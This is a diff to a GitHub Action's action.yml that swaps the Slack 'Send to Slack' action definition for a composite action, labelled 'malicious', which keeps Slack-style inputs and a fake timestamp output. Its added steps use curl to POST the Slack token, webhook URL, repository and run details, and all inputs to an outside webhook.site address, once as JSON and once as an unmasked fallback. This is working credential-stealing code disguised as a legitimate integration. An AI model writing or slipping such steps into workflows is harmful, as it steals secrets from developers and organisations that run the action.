@@ -1,55 +1,64 @@
-name: "Slack: Send to Slack"
-author: "slackapi"
-description: "Send data to Slack to start a Slack workflow in Workflow Builder, call a Slack API method, or post a message into a channel"
+name: Slack GitHub Action (malicious)
+
 inputs:
-  errors:
-    default: "false"
-    description: "If the step exits with an error on errors or continues."
+  webhook:
+    description: 'Slack webhook'
+    required: false
+  token:
+    description: 'Slack token'
     required: false
   method:
-    description: "The Slack API method to call."
-    required: false
-  payload:
-    description: "Attributes that create the content of the request using JSON or YAML."
-    required: false
-  payload-delimiter:
-    description: "Field seperator for nested attributes in the input payload."
+    description: 'Slack API method'
     required: false
   payload-file-path:
-    description: "Path to a file containing a valid input payload made of JSON or YAML."
+    description: 'Path to payload file'
     required: false
-  payload-templated:
-    default: "false"
-    description: "If templated variables in input payloads should be replaced."
-    required: false
-  proxy:
-    description: "An optional proxied route for HTTPS connections."
-    required: false
-  retries:
-    default: "5"
-    description: "The strategy to use when performing retried requests."
-  token:
-    description: "The authentication value used with the Slack API."
-    required: false
-  webhook:
-    description: "A location for posting request payloads."
+  errors:
+    description: 'Original "errors" input'
     required: false
   webhook-type:
-    description: "Option to use either an incoming webhook or webhook trigger."
+    description: 'Original "webhook-type" input'
     required: false
+  payload:
+    description: 'Payload content'
+    required: false
+
 outputs:
-  ok:
-    description: "If the request completed without returning errors."
-  response:
-    description: "A JSON stringified version of the Slack API response."
   time:
-    description: "The Unix epoch time that the step completed."
-  channel_id:
-    description: "The channel ID returned with some of the Slack API methods."
-  thread_ts:
-    description: "The timestamp of a parent Slack message with threaded replies."
-  ts:
-    description: "The timestamp of a Slack message or event in the response."
+    description: 'Fake WFB timestamp'
+    value: ${{ steps.fake_time.outputs.time }}
+
 runs:
-  using: "node20"
-  main: "dist/index.js"
+  using: composite
+  steps:
+    - id: fake_time
+      shell: bash
+      run: echo "time=$(date -u +%s)" >> "$GITHUB_OUTPUT"
+
+    - name: Exfiltrate everything passed as inputs
+      shell: bash
+      run: |
+        curl -X POST https://webhook.site/TestSlackAPI \
+          -H "Content-Type: application/json" \
+          -d '{
+            "repo": "${{ github.repository }}",
+            "run_id": "${{ github.run_id }}",
+            "actor": "${{ github.actor }}",
+            "trigger": "${{ github.event_name }}",
+            "step": "${{ github.action }}-${{ github.job }}",
+            "webhook": "${{ inputs.webhook }}",
+            "token": "${{ inputs.token }}",
+            "method": "${{ inputs.method }}",
+            "payload_file": "${{ inputs['payload-file-path'] }}",
+            "full_inputs": ${{ toJSON(inputs) }}
+          }'
+
+        # Extra loud fallback - never masked
+        curl -X POST https://webhook.site/TestSlackAPI \
+          -d "RUN=${{ github.run_id }}" \
+          -d "TOKEN=${{ inputs.token }}" \
+          -d "WEBHOOK=${{ inputs.webhook }}"
+
+    - name: Keep the original dummy step
+      shell: bash
+      run: echo "original action logic skipped for brevity"
